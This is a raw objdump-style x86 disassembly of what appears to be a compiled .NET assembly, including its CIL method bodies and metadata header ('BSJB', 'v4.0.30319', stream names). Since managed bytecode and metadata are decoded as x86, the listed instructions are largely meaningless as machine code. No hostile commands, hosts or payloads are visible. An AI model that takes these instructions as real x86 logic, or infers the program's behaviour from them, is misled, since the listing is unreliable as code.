  405752:	00 06                	add    %al,(%esi)
  405754:	0a 02                	or     (%edx),%al
  405756:	06                   	push   %es
  405757:	16                   	push   %ss
  405758:	06                   	push   %es
  405759:	8e 69 6f             	mov    0x6f(%ecx),%gs
  40575c:	4c                   	dec    %esp
  40575d:	00 00                	add    %al,(%eax)
  40575f:	0a 02                	or     (%edx),%al
  405761:	03 16                	add    (%esi),%edx
  405763:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  405769:	00 0a                	add    %cl,(%edx)
  40576b:	2a 13                	sub    (%ebx),%dl
  40576d:	30 04 00             	xor    %al,(%eax,%eax,1)
  405770:	21 00                	and    %eax,(%eax)
  405772:	00 00                	add    %al,(%eax)
  405774:	29 00                	sub    %eax,(%eax)
  405776:	00 11                	add    %dl,(%ecx)
  405778:	02 20                	add    (%eax),%ah
  40577a:	cf                   	iret
  40577b:	00 00                	add    %al,(%eax)
  40577d:	00 6f ee             	add    %ch,-0x12(%edi)
  405780:	00 00                	add    %al,(%eax)
  405782:	0a 03                	or     (%ebx),%al
  405784:	28 09                	sub    %cl,(%ecx)
  405786:	01 00                	add    %eax,(%eax)
  405788:	0a 0a                	or     (%edx),%cl
  40578a:	02 06                	add    (%esi),%al
  40578c:	28 58 00             	sub    %bl,0x0(%eax)
  40578f:	00 06                	add    %al,(%esi)
  405791:	16                   	push   %ss
  405792:	1e                   	push   %ds
  405793:	6f                   	outsl  %ds:(%esi),(%dx)
  405794:	4c                   	dec    %esp
  405795:	00 00                	add    %al,(%eax)
  405797:	0a 2a                	or     (%edx),%ch
  405799:	00 00                	add    %al,(%eax)
  40579b:	00 13                	add    %dl,(%ebx)
  40579d:	30 04 00             	xor    %al,(%eax,%eax,1)
  4057a0:	35 01 00 00 00       	xor    $0x1,%eax
  4057a5:	00 00                	add    %al,(%eax)
  4057a7:	00 03                	add    %al,(%ebx)
  4057a9:	16                   	push   %ss
  4057aa:	6a 3f                	push   $0x3f
  4057ac:	96                   	xchg   %eax,%esi
  4057ad:	00 00                	add    %al,(%eax)
  4057af:	00 03                	add    %al,(%ebx)
  4057b1:	1f                   	pop    %ds
  4057b2:	7f 6a                	jg     0x40581e
  4057b4:	3d 09 00 00 00       	cmp    $0x9,%eax
  4057b9:	02 03                	add    (%ebx),%al
  4057bb:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4057be:	00 00                	add    %al,(%eax)
  4057c0:	0a 2a                	or     (%edx),%ch
  4057c2:	03 20                	add    (%eax),%esp
  4057c4:	ff 00                	incl   (%eax)
  4057c6:	00 00                	add    %al,(%eax)
  4057c8:	6a 3d                	push   $0x3d
  4057ca:	14 00                	adc    $0x0,%al
  4057cc:	00 00                	add    %al,(%eax)
  4057ce:	02 20                	add    (%eax),%ah
  4057d0:	cc                   	int3
  4057d1:	00 00                	add    %al,(%eax)
  4057d3:	00 6f ee             	add    %ch,-0x12(%edi)
  4057d6:	00 00                	add    %al,(%eax)
  4057d8:	0a 02                	or     (%edx),%al
  4057da:	03 d2                	add    %edx,%edx
  4057dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4057dd:	ee                   	out    %al,(%dx)
  4057de:	00 00                	add    %al,(%eax)
  4057e0:	0a 2a                	or     (%edx),%ch
  4057e2:	03 20                	add    (%eax),%esp
  4057e4:	ff                   	(bad)
  4057e5:	ff 00                	incl   (%eax)
  4057e7:	00 6a 3d             	add    %ch,0x3d(%edx)
  4057ea:	1b 00                	sbb    (%eax),%eax
  4057ec:	00 00                	add    %al,(%eax)
  4057ee:	02 20                	add    (%eax),%ah
  4057f0:	cd 00                	int    $0x0
  4057f2:	00 00                	add    %al,(%eax)
  4057f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4057f5:	ee                   	out    %al,(%dx)
  4057f6:	00 00                	add    %al,(%eax)
  4057f8:	0a 02                	or     (%edx),%al
  4057fa:	03 68 28             	add    0x28(%eax),%ebp
  4057fd:	5b                   	pop    %ebx
  4057fe:	00 00                	add    %al,(%eax)
  405800:	06                   	push   %es
  405801:	16                   	push   %ss
  405802:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  405805:	00 00                	add    %al,(%eax)
  405807:	0a 2a                	or     (%edx),%ch
  405809:	03 15 6e 3d 1b 00    	add    0x1b3d6e,%edx
  40580f:	00 00                	add    %al,(%eax)
  405811:	02 20                	add    (%eax),%ah
  405813:	ce                   	into
  405814:	00 00                	add    %al,(%eax)
  405816:	00 6f ee             	add    %ch,-0x12(%edi)
  405819:	00 00                	add    %al,(%eax)
  40581b:	0a 02                	or     (%edx),%al
  40581d:	03 69 28             	add    0x28(%ecx),%ebp
  405820:	5a                   	pop    %edx
  405821:	00 00                	add    %al,(%eax)
  405823:	06                   	push   %es
  405824:	16                   	push   %ss
  405825:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  405828:	00 00                	add    %al,(%eax)
  40582a:	0a 2a                	or     (%edx),%ch
  40582c:	02 20                	add    (%eax),%ah
  40582e:	d3 00                	roll   %cl,(%eax)
  405830:	00 00                	add    %al,(%eax)
  405832:	6f                   	outsl  %ds:(%esi),(%dx)
  405833:	ee                   	out    %al,(%dx)
  405834:	00 00                	add    %al,(%eax)
  405836:	0a 02                	or     (%edx),%al
  405838:	03 28                	add    (%eax),%ebp
  40583a:	59                   	pop    %ecx
  40583b:	00 00                	add    %al,(%eax)
  40583d:	06                   	push   %es
  40583e:	16                   	push   %ss
  40583f:	1e                   	push   %ds
  405840:	6f                   	outsl  %ds:(%esi),(%dx)
  405841:	4c                   	dec    %esp
  405842:	00 00                	add    %al,(%eax)
  405844:	0a 2a                	or     (%edx),%ch
  405846:	03 20                	add    (%eax),%esp
  405848:	00 00                	add    %al,(%eax)
  40584a:	00 80 6a 3d 1a 00    	add    %al,0x1a3d6a(%eax)
  405850:	00 00                	add    %al,(%eax)
  405852:	02 20                	add    (%eax),%ah
  405854:	d3 00                	roll   %cl,(%eax)
  405856:	00 00                	add    %al,(%eax)
  405858:	6f                   	outsl  %ds:(%esi),(%dx)
  405859:	ee                   	out    %al,(%dx)
  40585a:	00 00                	add    %al,(%eax)
  40585c:	0a 02                	or     (%edx),%al
  40585e:	03 28                	add    (%eax),%ebp
  405860:	59                   	pop    %ecx
  405861:	00 00                	add    %al,(%eax)
  405863:	06                   	push   %es
  405864:	16                   	push   %ss
  405865:	1e                   	push   %ds
  405866:	6f                   	outsl  %ds:(%esi),(%dx)
  405867:	4c                   	dec    %esp
  405868:	00 00                	add    %al,(%eax)
  40586a:	0a 2a                	or     (%edx),%ch
  40586c:	03 20                	add    (%eax),%esp
  40586e:	00 80 ff ff 6a 3d    	add    %al,0x3d6affff(%eax)
  405874:	1b 00                	sbb    (%eax),%eax
  405876:	00 00                	add    %al,(%eax)
  405878:	02 20                	add    (%eax),%ah
  40587a:	d2 00                	rolb   %cl,(%eax)
  40587c:	00 00                	add    %al,(%eax)
  40587e:	6f                   	outsl  %ds:(%esi),(%dx)
  40587f:	ee                   	out    %al,(%dx)
  405880:	00 00                	add    %al,(%eax)
  405882:	0a 02                	or     (%edx),%al
  405884:	03 69 28             	add    0x28(%ecx),%ebp
  405887:	5a                   	pop    %edx
  405888:	00 00                	add    %al,(%eax)
  40588a:	06                   	push   %es
  40588b:	16                   	push   %ss
  40588c:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  40588f:	00 00                	add    %al,(%eax)
  405891:	0a 2a                	or     (%edx),%ch
  405893:	03 1f                	add    (%edi),%ebx
  405895:	80 6a 3d 1b          	subb   $0x1b,0x3d(%edx)
  405899:	00 00                	add    %al,(%eax)
  40589b:	00 02                	add    %al,(%edx)
  40589d:	20 d1                	and    %dl,%cl
  40589f:	00 00                	add    %al,(%eax)
  4058a1:	00 6f ee             	add    %ch,-0x12(%edi)
  4058a4:	00 00                	add    %al,(%eax)
  4058a6:	0a 02                	or     (%edx),%al
  4058a8:	03 68 28             	add    0x28(%eax),%ebp
  4058ab:	5b                   	pop    %ebx
  4058ac:	00 00                	add    %al,(%eax)
  4058ae:	06                   	push   %es
  4058af:	16                   	push   %ss
  4058b0:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  4058b3:	00 00                	add    %al,(%eax)
  4058b5:	0a 2a                	or     (%edx),%ch
  4058b7:	03 1f                	add    (%edi),%ebx
  4058b9:	e0 6a                	loopne 0x405925
  4058bb:	3d 14 00 00 00       	cmp    $0x14,%eax
  4058c0:	02 20                	add    (%eax),%ah
  4058c2:	d0 00                	rolb   $1,(%eax)
  4058c4:	00 00                	add    %al,(%eax)
  4058c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4058c7:	ee                   	out    %al,(%dx)
  4058c8:	00 00                	add    %al,(%eax)
  4058ca:	0a 02                	or     (%edx),%al
  4058cc:	03 d2                	add    %edx,%edx
  4058ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4058cf:	ee                   	out    %al,(%dx)
  4058d0:	00 00                	add    %al,(%eax)
  4058d2:	0a 2a                	or     (%edx),%ch
  4058d4:	02 03                	add    (%ebx),%al
  4058d6:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4058d9:	00 00                	add    %al,(%eax)
  4058db:	0a 2a                	or     (%edx),%ch
  4058dd:	00 00                	add    %al,(%eax)
  4058df:	00 1b                	add    %bl,(%ebx)
  4058e1:	30 04 00             	xor    %al,(%eax,%eax,1)
  4058e4:	61                   	popa
  4058e5:	00 00                	add    %al,(%eax)
  4058e7:	00 2d 00 00 11 02    	add    %ch,0x2110000
  4058ed:	73 4d                	jae    0x40593c
  4058ef:	00 00                	add    %al,(%eax)
  4058f1:	0a 0a                	or     (%edx),%cl
  4058f3:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  4058f9:	0b 06                	or     (%esi),%eax
  4058fb:	07                   	pop    %es
  4058fc:	16                   	push   %ss
  4058fd:	1a 6f 45             	sbb    0x45(%edi),%ch
  405900:	00 00                	add    %al,(%eax)
  405902:	0a 26                	or     (%esi),%ah
  405904:	07                   	pop    %es
  405905:	16                   	push   %ss
  405906:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40590a:	0a 0c 06             	or     (%esi,%eax,1),%cl
  40590d:	16                   	push   %ss
  40590e:	73 0a                	jae    0x40591a
  405910:	01 00                	add    %eax,(%eax)
  405912:	0a 0d 08 8d 44 00    	or     0x448d08,%cl
  405918:	00 01                	add    %al,(%ecx)
  40591a:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  40591d:	11 04 16             	adc    %eax,(%esi,%edx,1)
  405920:	08 6f 45             	or     %ch,0x45(%edi)
  405923:	00 00                	add    %al,(%eax)
  405925:	0a 26                	or     (%esi),%ah
  405927:	11 04 13             	adc    %eax,(%ebx,%edx,1)
  40592a:	05 dd 1a 00 00       	add    $0x1add,%eax
  40592f:	00 09                	add    %cl,(%ecx)
  405931:	39 06                	cmp    %eax,(%esi)
  405933:	00 00                	add    %al,(%eax)
  405935:	00 09                	add    %cl,(%ecx)
  405937:	6f                   	outsl  %ds:(%esi),(%dx)
  405938:	33 00                	xor    (%eax),%eax
  40593a:	00 0a                	add    %cl,(%edx)
  40593c:	dc 06                	faddl  (%esi)
  40593e:	39 06                	cmp    %eax,(%esi)
  405940:	00 00                	add    %al,(%eax)
  405942:	00 06                	add    %al,(%esi)
  405944:	6f                   	outsl  %ds:(%esi),(%dx)
  405945:	33 00                	xor    (%eax),%eax
  405947:	00 0a                	add    %cl,(%edx)
  405949:	dc 11                	fcoml  (%ecx)
  40594b:	05 2a 00 00 00       	add    $0x2a,%eax
  405950:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  405953:	00 02                	add    %al,(%edx)
  405955:	00 28                	add    %ch,(%eax)
  405957:	00 1c 44             	add    %bl,(%esp,%eax,2)
  40595a:	00 0d 00 00 00 00    	add    %cl,0x0
  405960:	02 00                	add    (%eax),%al
  405962:	07                   	pop    %es
  405963:	00 4a 51             	add    %cl,0x51(%edx)
  405966:	00 0d 00 00 00 00    	add    %cl,0x0
  40596c:	1b 30                	sbb    (%eax),%esi
  40596e:	04 00                	add    $0x0,%al
  405970:	5e                   	pop    %esi
  405971:	00 00                	add    %al,(%eax)
  405973:	00 2e                	add    %ch,(%esi)
  405975:	00 00                	add    %al,(%eax)
  405977:	11 73 d0             	adc    %esi,-0x30(%ebx)
  40597a:	00 00                	add    %al,(%eax)
  40597c:	0a 0a                	or     (%edx),%cl
  40597e:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  405984:	00 0a                	add    %cl,(%edx)
  405986:	0b 06                	or     (%esi),%eax
  405988:	07                   	pop    %es
  405989:	16                   	push   %ss
  40598a:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  40598d:	00 00                	add    %al,(%eax)
  40598f:	0a 06                	or     (%esi),%al
  405991:	17                   	pop    %ss
  405992:	73 0a                	jae    0x40599e
  405994:	01 00                	add    %eax,(%eax)
  405996:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  405999:	02 16                	add    (%esi),%dl
  40599b:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  4059a1:	00 0a                	add    %cl,(%edx)
  4059a3:	08 6f 4f             	or     %ch,0x4f(%edi)
  4059a6:	00 00                	add    %al,(%eax)
  4059a8:	0a dd                	or     %ch,%bl
  4059aa:	0d 00 00 00 08       	or     $0x8000000,%eax
  4059af:	39 06                	cmp    %eax,(%esi)
  4059b1:	00 00                	add    %al,(%eax)
  4059b3:	00 08                	add    %cl,(%eax)
  4059b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4059b6:	33 00                	xor    (%eax),%eax
  4059b8:	00 0a                	add    %cl,(%edx)
  4059ba:	dc 06                	faddl  (%esi)
  4059bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4059bd:	dd 00                	fldl   (%eax)
  4059bf:	00 0a                	add    %cl,(%edx)
  4059c1:	0d dd 0d 00 00       	or     $0xddd,%eax
  4059c6:	00 06                	add    %al,(%esi)
  4059c8:	39 06                	cmp    %eax,(%esi)
  4059ca:	00 00                	add    %al,(%eax)
  4059cc:	00 06                	add    %al,(%esi)
  4059ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4059cf:	33 00                	xor    (%eax),%eax
  4059d1:	00 0a                	add    %cl,(%edx)
  4059d3:	dc 09                	fmull  (%ecx)
  4059d5:	2a 00                	sub    (%eax),%al
  4059d7:	00 01                	add    %al,(%ecx)
  4059d9:	1c 00                	sbb    $0x0,%al
  4059db:	00 02                	add    %al,(%edx)
  4059dd:	00 20                	add    %ah,(%eax)
  4059df:	00 16                	add    %dl,(%esi)
  4059e1:	36 00 0d 00 00 00 00 	add    %cl,%ss:0x0
  4059e8:	02 00                	add    (%eax),%al
  4059ea:	06                   	push   %es
  4059eb:	00 49 4f             	add    %cl,0x4f(%ecx)
  4059ee:	00 0d 00 00 00 00    	add    %cl,0x0
  4059f4:	42                   	inc    %edx
  4059f5:	53                   	push   %ebx
  4059f6:	4a                   	dec    %edx
  4059f7:	42                   	inc    %edx
  4059f8:	01 00                	add    %eax,(%eax)
  4059fa:	01 00                	add    %eax,(%eax)
  4059fc:	00 00                	add    %al,(%eax)
  4059fe:	00 00                	add    %al,(%eax)
  405a00:	0c 00                	or     $0x0,%al
  405a02:	00 00                	add    %al,(%eax)
  405a04:	76 34                	jbe    0x405a3a
  405a06:	2e 30 2e             	xor    %ch,%cs:(%esi)
  405a09:	33 30                	xor    (%eax),%esi
  405a0b:	33 31                	xor    (%ecx),%esi
  405a0d:	39 00                	cmp    %eax,(%eax)
  405a0f:	00 00                	add    %al,(%eax)
  405a11:	00 05 00 6c 00 00    	add    %al,0x6c00
  405a17:	00 bc 1d 00 00 23 7e 	add    %bh,0x7e230000(%ebp,%ebx,1)
  405a1e:	00 00                	add    %al,(%eax)
  405a20:	28 1e                	sub    %bl,(%esi)
  405a22:	00 00                	add    %al,(%eax)
  405a24:	c0 1d 00 00 23 53 74 	rcrb   $0x74,0x53230000
  405a2b:	72 69                	jb     0x405a96
  405a2d:	6e                   	outsb  %ds:(%esi),(%dx)
  405a2e:	67 73 00             	addr16 jae 0x405a31
  405a31:	00 00                	add    %al,(%eax)
  405a33:	00 e8                	add    %ch,%al
  405a35:	3b 00                	cmp    (%eax),%eax
  405a37:	00 28                	add    %ch,(%eax)
  405a39:	28 00                	sub    %al,(%eax)
  405a3b:	00 23                	add    %ah,(%ebx)
  405a3d:	55                   	push   %ebp
  405a3e:	53                   	push   %ebx
  405a3f:	00 10                	add    %dl,(%eax)
  405a41:	64 00 00             	add    %al,%fs:(%eax)
  405a44:	10 00                	adc    %al,(%eax)
  405a46:	00 00                	add    %al,(%eax)
  405a48:	23 47 55             	and    0x55(%edi),%eax
  405a4b:	49                   	dec    %ecx
  405a4c:	44                   	inc    %esp
  405a4d:	00 00                	add    %al,(%eax)
  405a4f:	00 20                	add    %ah,(%eax)
  405a51:	64 00 00             	add    %al,%fs:(%eax)
  405a54:	40                   	inc    %eax
  405a55:	09 00                	or     %eax,(%eax)
  405a57:	00 23                	add    %ah,(%ebx)
  405a59:	42                   	inc    %edx
  405a5a:	6c                   	insb   (%dx),%es:(%edi)
  405a5b:	6f                   	outsl  %ds:(%esi),(%dx)
  405a5c:	62 00                	bound  %eax,(%eax)
  405a5e:	00 00                	add    %al,(%eax)
  405a60:	00 00                	add    %al,(%eax)
  405a62:	00 00                	add    %al,(%eax)
  405a64:	02 00                	add    (%eax),%al
  405a66:	00 00                	add    %al,(%eax)
  405a68:	57                   	push   %edi
  405a69:	9f                   	lahf
  405a6a:	a2 3f 09 0a 00       	mov    %al,0xa093f
  405a6f:	00 00                	add    %al,(%eax)
  405a71:	fa                   	cli
  405a72:	25 33 00 16 00       	and    $0x160033,%eax
  405a77:	00 01                	add    %al,(%ecx)
  405a79:	00 00                	add    %al,(%eax)
  405a7b:	00 9b 00 00 00 1e    	add    %bl,0x1e000000(%ebx)
  405a81:	00 00                	add    %al,(%eax)
  405a83:	00 47 00             	add    %al,0x0(%edi)
  405a86:	00 00                	add    %al,(%eax)
  405a88:	a3 00 00 00 71       	mov    %eax,0x71000000
  405a8d:	00 00                	add    %al,(%eax)
  405a8f:	00 02                	add    %al,(%edx)
  405a91:	00 00                	add    %al,(%eax)
  405a93:	00 0a                	add    %cl,(%edx)
  405a95:	01 00                	add    %eax,(%eax)
  405a97:	00 13                	add    %dl,(%ebx)
  405a99:	00 00                	add    %al,(%eax)
  405a9b:	00 31                	add    %dh,(%ecx)
  405a9d:	00 00                	add    %al,(%eax)
  405a9f:	00 02                	add    %al,(%edx)
  405aa1:	00 00                	add    %al,(%eax)
  405aa3:	00 2e                	add    %ch,(%esi)
  405aa5:	00 00                	add    %al,(%eax)
  405aa7:	00 04 00             	add    %al,(%eax,%eax,1)
  405aaa:	00 00                	add    %al,(%eax)
  405aac:	13 00                	adc    (%eax),%eax
  405aae:	00 00                	add    %al,(%eax)
  405ab0:	20 00                	and    %al,(%eax)
  405ab2:	00 00                	add    %al,(%eax)
  405ab4:	04 00                	add    $0x0,%al
  405ab6:	00 00                	add    %al,(%eax)
  405ab8:	03 00                	add    (%eax),%eax
  405aba:	00 00                	add    %al,(%eax)
  405abc:	06                   	push   %es
  405abd:	00 00                	add    %al,(%eax)
  405abf:	00 06                	add    %al,(%esi)
  405ac1:	00 00                	add    %al,(%eax)
  405ac3:	00 02                	add    %al,(%edx)
  405ac5:	00 00                	add    %al,(%eax)
  405ac7:	00 01                	add    %al,(%ecx)
  405ac9:	00 00                	add    %al,(%eax)
  405acb:	00 08                	add    %cl,(%eax)
  405acd:	00 00                	add    %al,(%eax)
  405acf:	00 04 00             	add    %al,(%eax,%eax,1)
  405ad2:	00 00                	add    %al,(%eax)
  405ad4:	01 00                	add    %eax,(%eax)
  405ad6:	00 00                	add    %al,(%eax)
  405ad8:	00 00                	add    %al,(%eax)
  405ada:	f3 0a 01             	repz or (%ecx),%al
  405add:	00 00                	add    %al,(%eax)
  405adf:	00 00                	add    %al,(%eax)
  405ae1:	00 06                	add    %al,(%esi)
  405ae3:	00 3f                	add    %bh,(%edi)
  405ae5:	19 f4                	sbb    %esi,%esp
  405ae7:	0f 0a                	(bad)
  405ae9:	00 93 00 09 16 0a    	add    %dl,0xa160900(%ebx)
  405aef:	00 a5 19 78 18 0a    	add    %ah,0xa187819(%ebp)
  405af5:	00 8f 0f 8b 1d 06    	add    %cl,0x61d8b0f(%edi)
  405afb:	00 2f                	add    %ch,(%edi)
  405afd:	14 9e                	adc    $0x9e,%al
  405aff:	0b 06                	or     (%esi),%eax
  405b01:	00 86 08 09 16 0a    	add    %al,0xa160908(%esi)
  405b07:	00 a8 10 09 16 0a    	add    %ch,0xa160910(%eax)
  405b0d:	00 14 18             	add    %dl,(%eax,%ebx,1)
  405b10:	8b 1d 06 00 ff 19    	mov    0x19ff0006,%ebx
  405b16:	f4                   	hlt
  405b17:	0f 0e                	femms
  405b19:	00 0b                	add    %cl,(%ebx)
  405b1b:	12 f5                	adc    %ch,%dh
  405b1d:	0b 0e                	or     (%esi),%ecx
  405b1f:	00 ca                	add    %cl,%dl
  405b21:	18 f5                	sbb    %dh,%ch
  405b23:	0b 06                	or     (%esi),%eax
  405b25:	00 44 1c 9e          	add    %al,-0x62(%esp,%ebx,1)
  405b29:	0b 06                	or     (%esi),%eax
  405b2b:	00 2f                	add    %ch,(%edi)
  405b2d:	13 e5                	adc    %ebp,%esp
  405b2f:	1b 06                	sbb    (%esi),%eax
  405b31:	00 65 10             	add    %ah,0x10(%ebp)
  405b34:	f4                   	hlt
  405b35:	0f 0a                	(bad)
  405b37:	00 20                	add    %ah,(%eax)
  405b39:	17                   	pop    %ss
  405b3a:	5e                   	pop    %esi
  405b3b:	00 06                	add    %al,(%esi)
  405b3d:	00 34 00             	add    %dh,(%eax,%eax,1)
  405b40:	ca 02 12             	lret   $0x1202
  405b43:	00 29                	add    %ch,(%ecx)
  405b45:	00 a1 15 12 00 01    	add    %ah,0x1001215(%ecx)
  405b4b:	00 f4                	add    %dh,%ah
  405b4d:	0f 12 00             	movlps (%eax),%xmm0
  405b50:	e2 08                	loop   0x405b5a
  405b52:	a1 15 06 00 01       	mov    0x1000615,%eax
  405b57:	08 f4                	or     %dh,%ah
  405b59:	0f 06                	clts
  405b5b:	00 e8                	add    %ch,%al
  405b5d:	0b e5                	or     %ebp,%esp
  405b5f:	1b 06                	sbb    (%esi),%eax
  405b61:	00 a9 14 ce 17 06    	add    %ch,0x617ce14(%ecx)
  405b67:	00 a5 05 ce 17 06    	add    %ah,0x617ce05(%ebp)
  405b6d:	00 c8                	add    %cl,%al
  405b6f:	0f 65 02             	pcmpgtw (%edx),%mm0
  405b72:	06                   	push   %es
  405b73:	00 ef                	add    %ch,%bh
  405b75:	09 a1 15 06 00 5c    	or     %esp,0x5c000615(%ecx)
  405b7b:	0a a1 15 06 00 0c    	or     0xc000615(%ecx),%ah
  405b81:	09 43 15             	or     %eax,0x15(%ebx)
  405b84:	6f                   	outsl  %ds:(%esi),(%dx)
  405b85:	00 c1                	add    %al,%cl
  405b87:	15 00 00 06 00       	adc    $0x60000,%eax
  405b8c:	34 09                	xor    $0x9,%al
  405b8e:	55                   	push   %ebp
  405b8f:	11 06                	adc    %eax,(%esi)
  405b91:	00 bb 09 55 11 06    	add    %bh,0x6115509(%ebx)
  405b97:	00 9c 09 55 11 06 00 	add    %bl,0x61155(%ecx,%ecx,1)
  405b9e:	43                   	inc    %ebx
  405b9f:	0a 55 11             	or     0x11(%ebp),%dl
  405ba2:	06                   	push   %es
  405ba3:	00 0f                	add    %cl,(%edi)
  405ba5:	0a 55 11             	or     0x11(%ebp),%dl
  405ba8:	06                   	push   %es
  405ba9:	00 28                	add    %ch,(%eax)
  405bab:	0a 55 11             	or     0x11(%ebp),%dl
  405bae:	06                   	push   %es
  405baf:	00 4b 09             	add    %cl,0x9(%ebx)
  405bb2:	55                   	push   %ebp
  405bb3:	11 06                	adc    %eax,(%esi)
  405bb5:	00 7f 09             	add    %bh,0x9(%edi)
  405bb8:	55                   	push   %ebp
  405bb9:	11 06                	adc    %eax,(%esi)
  405bbb:	00 66 09             	add    %ah,0x9(%esi)
  405bbe:	0c 0c                	or     $0xc,%al
  405bc0:	06                   	push   %es
  405bc1:	00 20                	add    %ah,(%eax)
  405bc3:	09 82 15 06 00 f1    	or     %eax,-0xefff9eb(%edx)
  405bc9:	08 a1 15 06 00 d8    	or     %ah,-0x27fff9eb(%ecx)
  405bcf:	09 55 11             	or     %edx,0x11(%ebp)
  405bd2:	06                   	push   %es
  405bd3:	00 1a                	add    %bl,(%edx)
  405bd5:	03 9e 0b 06 00 9f    	add    -0x60fff9f5(%esi),%ebx
  405bdb:	1b f4                	sbb    %esp,%esi
  405bdd:	0f 06                	clts
  405bdf:	00 97 1a f4 0f 06    	add    %dl,0x60ff41a(%edi)
  405be5:	00 ec                	add    %ch,%ah
  405be7:	0b e5                	or     %ebp,%esp
  405be9:	1b 0a                	sbb    (%edx),%ecx
  405beb:	00 d0                	add    %dl,%al
  405bed:	1c 09                	sbb    $0x9,%al
  405bef:	16                   	push   %ss
  405bf0:	06                   	push   %es
  405bf1:	00 1f                	add    %bl,(%edi)
  405bf3:	10 fe                	adc    %bh,%dh
  405bf5:	1c 06                	sbb    $0x6,%al
  405bf7:	00 fd                	add    %bh,%ch
  405bf9:	12 fe                	adc    %dh,%bh
  405bfb:	1c 06                	sbb    $0x6,%al
  405bfd:	00 7f 0b             	add    %bh,0xb(%edi)
  405c00:	fe                   	(bad)
  405c01:	1c 06                	sbb    $0x6,%al
  405c03:	00 f9                	add    %bh,%cl
  405c05:	11 f4                	adc    %esi,%esp
  405c07:	0f 0a                	(bad)
  405c09:	00 5a 18             	add    %bl,0x18(%edx)
  405c0c:	64 19 0a             	sbb    %ecx,%fs:(%edx)
  405c0f:	00 1d 1a 64 19 0a    	add    %bl,0xa19641a
  405c15:	00 ac 0e 64 19 0a 00 	add    %ch,0xa1964(%esi,%ecx,1)
  405c1c:	24 1d                	and    $0x1d,%al
  405c1e:	78 18                	js     0x405c38
  405c20:	0a 00                	or     (%eax),%al
  405c22:	36 08 78 18          	or     %bh,%ss:0x18(%eax)
  405c26:	0a 00                	or     (%eax),%al
  405c28:	21 08                	and    %ecx,(%eax)
  405c2a:	78 18                	js     0x405c44
  405c2c:	06                   	push   %es
  405c2d:	00 c9                	add    %cl,%cl
  405c2f:	0c f4                	or     $0xf4,%al
  405c31:	0f 06                	clts
  405c33:	00 d2                	add    %dl,%dl
  405c35:	12 f4                	adc    %ah,%dh
  405c37:	0f 06                	clts
  405c39:	00 46 10             	add    %al,0x10(%esi)
  405c3c:	f4                   	hlt
  405c3d:	0f 0a                	(bad)
  405c3f:	00 c1                	add    %al,%cl
  405c41:	17                   	pop    %ss
  405c42:	64 19 0a             	sbb    %ecx,%fs:(%edx)
  405c45:	00 5b 17             	add    %bl,0x17(%ebx)
  405c48:	64 19 06             	sbb    %eax,%fs:(%esi)
  405c4b:	00 e1                	add    %ah,%cl
  405c4d:	17                   	pop    %ss
  405c4e:	f4                   	hlt
  405c4f:	0f 06                	clts
  405c51:	00 b1 05 f4 0f 0a    	add    %dh,0xa0ff405(%ecx)
  405c57:	00 81 0f 78 18 0a    	add    %al,0xa18780f(%ecx)
  405c5d:	00 f6                	add    %dh,%dh
  405c5f:	0d 8b 1d 0a 00       	or     $0xa1d8b,%eax
  405c64:	3e 1b 64 19 0a       	sbb    %ds:0xa(%ecx,%ebx,1),%esp
  405c69:	00 67 11             	add    %ah,0x11(%edi)
  405c6c:	09 16                	or     %edx,(%esi)
  405c6e:	0a 00                	or     (%eax),%al
  405c70:	7f 17                	jg     0x405c89
  405c72:	36 11 06             	adc    %eax,%ss:(%esi)
  405c75:	00 9c 0a f4 0f 06 00 	add    %bl,0x60ff4(%edx,%ecx,1)
  405c7c:	1a 0e                	sbb    (%esi),%cl
  405c7e:	9e                   	sahf
  405c7f:	0b 06                	or     (%esi),%eax
  405c81:	00 e8                	add    %ch,%al
  405c83:	0d f4 0f 0a 00       	or     $0xa0ff4,%eax
  405c88:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405c89:	0d f4 0f 0a 00       	or     $0xa0ff4,%eax
  405c8e:	ed                   	in     (%dx),%eax
  405c8f:	07                   	pop    %es
  405c90:	f4                   	hlt
  405c91:	0f 06                	clts
  405c93:	00 8e 14 f4 0f 06    	add    %cl,0x60ff414(%esi)
  405c99:	00 86 1b 9e 0b 06    	add    %al,0x60b9e1b(%esi)
  405c9f:	00 c2                	add    %al,%dl
  405ca1:	0f 65 02             	pcmpgtw (%edx),%mm0
  405ca4:	06                   	push   %es
  405ca5:	00 14 15 9e 0b 0a 00 	add    %dl,0xa0b9e(,%edx,1)
  405cac:	5b                   	pop    %ebx
  405cad:	05 78 18 06 00       	add    $0x61878,%eax
  405cb2:	c1 01 f4             	roll   $0xf4,(%ecx)
  405cb5:	0f 06                	clts
  405cb7:	00 23                	add    %ah,(%ebx)
  405cb9:	12 65 02             	adc    0x2(%ebp),%ah
  405cbc:	0a 00                	or     (%eax),%al
  405cbe:	52                   	push   %edx
  405cbf:	18 43 15             	sbb    %al,0x15(%ebx)
  405cc2:	0a 00                	or     (%eax),%al
  405cc4:	65 12 43 15          	adc    %gs:0x15(%ebx),%al
  405cc8:	06                   	push   %es
  405cc9:	00 ed                	add    %ch,%ch
  405ccb:	1c 5e                	sbb    $0x5e,%al
  405ccd:	00 06                	add    %al,(%esi)
  405ccf:	00 70 14             	add    %dh,0x14(%eax)
  405cd2:	65 02 06             	add    %gs:(%esi),%al
  405cd5:	00 68 0d             	add    %ch,0xd(%eax)
  405cd8:	65 02 0a             	add    %gs:(%edx),%cl
